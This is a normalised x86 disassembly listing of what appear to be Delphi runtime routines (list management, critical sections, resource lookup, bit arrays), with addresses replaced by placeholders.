dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_419358
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a08c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41a040
sub_41955c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a19c
mov edx ebp
call sub_419160
test al al
jne r-xdata
sub_4195a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f58
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41a040
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a19c
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41a1f8
test eax eax
jge r-xdata
sub_4195fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a19c
mov esi eax
mov edx ebp
mov eax esi
call sub_419198
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_40321c
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a08c
sub_41964c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_41974b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419752
mov eax [ rw-data ]
call sub_4195f0
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a040
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a19c
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_419074
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a040
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a19c
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_419752
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_419778
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4197a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_419538
xor edx edx
push ebp
push sub_41981f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4195f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a54
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a19c
mov edx [ ebp - 0x4 ]
call sub_419014
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41983c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41989c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4198a3
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_4198a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_4198ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41939c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4198f5
mov eax [ rw-data ]
call sub_4195f0
retn
sub_4198fc
push ebx
push esi
mov esi eax
mov eax esi
call sub_4198a8
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_41983c
sub_41991c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_419981
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41955c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_419544
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419988
mov eax [ rw-data ]
call sub_4195f0
retn
mov eax ebx
call sub_4031a8
mov ebx eax
sub_41998c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_4199ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4195fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199d5
mov eax [ rw-data ]
call sub_4195f0
retn
sub_4199d8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_419a1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4195a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a21
mov eax [ rw-data ]
call sub_4195f0
retn
sub_419a24
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_419a6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_419470
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a72
mov eax [ rw-data ]
call sub_4195f0
retn
sub_419a78
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419538
xor eax eax
push ebp
push sub_419ac6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_41923c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419acd
mov eax [ rw-data ]
call sub_4195f0
retn
sub_419b2c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403540
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_419b64
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b2c
mov edx eax
mov eax [ rw-data ]
call sub_41a480
pop edi
pop esi
pop ebx
retn
sub_419b90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a508
mov esi eax
xor edx edx
push ebp
push sub_419bfa
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
mov edx ebx
mov eax esi
call sub_41a19c
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a54
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419c0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_40800c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419c4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403fc0
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_419c90
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41a1f8
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41a040
sub_419ce8
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41a19c
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_419d28
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_419ce8
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_419d4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40442c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c66c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419dc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41c16c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_419dd0
push ebx
call sub_4060cc
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_4060cc
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41a040
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov ebx eax
call sub_4060cc
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov ebx eax
call sub_4060cc
mov [ eax + 0xc ] ebx
sub_419e28
push ebx
push esi
push edi
call sub_4060cc
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a19c
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_419e58
push ebx
push esi
call sub_4060cc
mov eax [ eax + 0x8 ]
call sub_40321c
call sub_4060cc
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_41a284
mov esi eax
call sub_4060cc
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41a08c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_4060cc
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_40321c
sub_419eb4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_419f4a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f51
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031a8
call sub_419eb4
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40316c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40537c
call sub_4053cc
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_419d4c
or bl al
sub_419f5c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41a00a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_419feb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403164
call sub_419eb4
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_419dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ff2
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_419e28
retn
call sub_419e58
sub_41a020
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41a040
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a08c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a128
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_402988
mov edx esi
mov eax ebx
call sub_41a19c
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a0f0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a0ec
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
jmp sub_4039a8
sub_41a128
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41a170
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405e60
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a0f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a177
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41a19c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a128
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_41a1c4
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41a300
retn
sub_41a1f8
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41a218
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a128
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_402988
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a290
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a128
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a2e0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a1f8
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41a08c
sub_41a300
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a128
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4027cc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41a33c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a128
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41a300
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c30
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41a08c
dec ebp
inc edi
jne r-xdata
sub_41a3b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41a404
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035a8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a508
xor eax eax
push ebp
push sub_41a466
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40321c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40320c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a46d
mov eax [ ebp - 0x4 ]
call sub_41a56c
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41a480
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a508
xor eax eax
push ebp
push sub_41a4fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a040
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a1f8
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a503
mov eax [ ebp - 0x4 ]
call sub_41a56c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41a128
sub_41a51c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a508
xor eax eax
push ebp
push sub_41a55f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a2e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a566
mov eax [ ebp - 0x4 ]
call sub_41a56c
retn
sub_41a578
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a5cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41a5cc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41a5a8
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_40278c
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c30
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4027ac
mov edx edi
mov eax ebp
call sub_41a5c0
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_402988
sub_41a670
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41a5a8
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41a5cc
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_41a69c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_41a714
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_41ce0c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41a754
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a80a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40316c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
jmp r-xdata
